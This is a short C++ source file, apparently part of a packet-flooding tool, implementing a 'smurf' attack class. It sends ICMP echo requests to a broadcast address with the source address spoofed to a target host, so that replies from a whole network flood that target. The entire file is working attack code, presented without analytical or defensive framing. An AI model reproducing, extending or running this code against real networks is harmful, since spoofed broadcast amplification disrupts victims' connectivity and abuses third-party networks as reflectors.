#include "smurf.h"

#include <arpa/inet.h>

smurf::smurf(std::shared_ptr<Config> config) : icmp_flood(std::move(config)) {

}

void smurf::finalize_hdr(icmphdr *icmp, iphdr *ip) {
    icmp->type = ICMP_ECHO;
    icmp->code = ICMP_NET_UNREACH;
    ip->daddr = inet_addr(config->bcast.c_str());
    ip->saddr = inet_addr(config->rhost.c_str());
    icmp_flood::finalize_hdr(icmp, ip);
}
